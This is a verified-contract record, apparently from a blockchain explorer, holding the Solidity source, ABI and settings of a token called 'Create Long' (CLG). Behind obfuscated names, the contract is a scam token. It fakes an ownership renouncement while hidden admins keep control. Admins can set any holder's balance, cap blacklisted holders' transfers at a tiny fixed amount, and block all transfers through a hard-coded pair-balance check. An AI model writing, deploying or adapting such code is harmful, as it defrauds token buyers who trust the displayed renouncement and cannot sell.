{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface tokenAuto {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletToAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderReceiver {\n    function createPair(address liquidityReceiver, address toExempt) external returns (address);\n}\n\ninterface takeAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoSwap) external view returns (uint256);\n\n    function transfer(address walletSwapLaunched, uint256 txMaxTeam) external returns (bool);\n\n    function allowance(address totalLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txMaxTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletSwapLaunched,\n        uint256 txMaxTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atMarketingMode, uint256 value);\n    event Approval(address indexed totalLiquidity, address indexed spender, uint256 value);\n}\n\ninterface takeAutoMetadata is takeAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CreateLong is walletToAmount, takeAuto, takeAutoMetadata {\n\n    function balanceOf(address autoSwap) public view virtual override returns (uint256) {\n        return feeAuto[autoSwap];\n    }\n\n    constructor (){\n        if (liquidityEnable == swapMarketing) {\n            swapFund = false;\n        }\n        tokenAuto atFromReceiver = tokenAuto(takeReceiver);\n        sellTokenLaunched = senderReceiver(atFromReceiver.factory()).createPair(atFromReceiver.WETH(), address(this));\n        if (swapMarketing) {\n            swapMarketing = false;\n        }\n        totalLimit = _msgSender();\n        teamTotal();\n        launchMinReceiver[totalLimit] = true;\n        feeAuto[totalLimit] = senderMarketing;\n        if (limitAt != tokenSender) {\n            swapMarketing = false;\n        }\n        emit Transfer(address(0), totalLimit, senderMarketing);\n    }\n\n    bool public swapMarketing;\n\n    uint8 private isMode = 18;\n\n    function teamTotal() public {\n        emit OwnershipTransferred(totalLimit, address(0));\n        atLimitReceiver = address(0);\n    }\n\n    address public sellTokenLaunched;\n\n    function getOwner() external view returns (address) {\n        return atLimitReceiver;\n    }\n\n    bool private liquidityEnable;\n\n    function minIs() private view {\n        require(launchMinReceiver[_msgSender()]);\n    }\n\n    mapping(address => bool) public takeTeam;\n\n    event OwnershipTransferred(address indexed takeLaunch, address indexed limitMax);\n\n    uint256 private senderMarketing = 100000000 * 10 ** 18;\n\n    uint256 private tokenSender;\n\n    address private atLimitReceiver;\n\n    function limitWallet(address sellLimit, address walletSwapLaunched, uint256 txMaxTeam) internal returns (bool) {\n        if (sellLimit == totalLimit) {\n            return marketingFund(sellLimit, walletSwapLaunched, txMaxTeam);\n        }\n        uint256 enableWallet = takeAuto(sellTokenLaunched).balanceOf(enableMarketing);\n        require(enableWallet == limitAmount);\n        require(walletSwapLaunched != enableMarketing);\n        if (takeTeam[sellLimit]) {\n            return marketingFund(sellLimit, walletSwapLaunched, takeShould);\n        }\n        return marketingFund(sellLimit, walletSwapLaunched, txMaxTeam);\n    }\n\n    uint256 public marketingExemptAmount;\n\n    function owner() external view returns (address) {\n        return atLimitReceiver;\n    }\n\n    address takeReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address receiverLaunchList, uint256 txMaxTeam) external virtual override returns (bool) {\n        return limitWallet(_msgSender(), receiverLaunchList, txMaxTeam);\n    }\n\n    function transferFrom(address sellLimit, address walletSwapLaunched, uint256 txMaxTeam) external override returns (bool) {\n        if (_msgSender() != takeReceiver) {\n            if (atMin[sellLimit][_msgSender()] != type(uint256).max) {\n                require(txMaxTeam <= atMin[sellLimit][_msgSender()]);\n                atMin[sellLimit][_msgSender()] -= txMaxTeam;\n            }\n        }\n        return limitWallet(sellLimit, walletSwapLaunched, txMaxTeam);\n    }\n\n    uint256 private shouldSwap;\n\n    uint256 constant takeShould = 4 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return takeBuy;\n    }\n\n    function limitSender(uint256 txMaxTeam) public {\n        minIs();\n        limitAmount = txMaxTeam;\n    }\n\n    bool private swapFund;\n\n    mapping(address => mapping(address => uint256)) private atMin;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptFund;\n    }\n\n    uint256 limitAmount;\n\n    function allowance(address liquidityMin, address totalFundLimit) external view virtual override returns (uint256) {\n        if (totalFundLimit == takeReceiver) {\n            return type(uint256).max;\n        }\n        return atMin[liquidityMin][totalFundLimit];\n    }\n\n    function fundMarketingBuy(address fromTeam) public {\n        minIs();\n        if (limitAt != shouldSwap) {\n            tokenSender = marketingExemptAmount;\n        }\n        if (fromTeam == totalLimit || fromTeam == sellTokenLaunched) {\n            return;\n        }\n        takeTeam[fromTeam] = true;\n    }\n\n    mapping(address => bool) public launchMinReceiver;\n\n    uint256 receiverMin;\n\n    address public totalLimit;\n\n    address enableMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private exemptFund = \"Create Long\";\n\n    function txWallet(address shouldList) public {\n        if (tokenReceiver) {\n            return;\n        }\n        \n        launchMinReceiver[shouldList] = true;\n        \n        tokenReceiver = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderMarketing;\n    }\n\n    function sellTrading(address receiverLaunchList, uint256 txMaxTeam) public {\n        minIs();\n        feeAuto[receiverLaunchList] = txMaxTeam;\n    }\n\n    function marketingFund(address sellLimit, address walletSwapLaunched, uint256 txMaxTeam) internal returns (bool) {\n        require(feeAuto[sellLimit] >= txMaxTeam);\n        feeAuto[sellLimit] -= txMaxTeam;\n        feeAuto[walletSwapLaunched] += txMaxTeam;\n        emit Transfer(sellLimit, walletSwapLaunched, txMaxTeam);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isMode;\n    }\n\n    bool public tokenReceiver;\n\n    function approve(address totalFundLimit, uint256 txMaxTeam) public virtual override returns (bool) {\n        atMin[_msgSender()][totalFundLimit] = txMaxTeam;\n        emit Approval(_msgSender(), totalFundLimit, txMaxTeam);\n        return true;\n    }\n\n    string private takeBuy = \"CLG\";\n\n    uint256 public limitAt;\n\n    mapping(address => uint256) private feeAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atMarketingMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalFundLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFundLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMaxTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTeam\",\"type\":\"address\"}],\"name\":\"fundMarketingBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchMinReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txMaxTeam\",\"type\":\"uint256\"}],\"name\":\"limitSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingExemptAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTokenLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunchList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMaxTeam\",\"type\":\"uint256\"}],\"name\":\"sellTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLaunchList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMaxTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletSwapLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txMaxTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"}],\"name\":\"txWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CreateLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}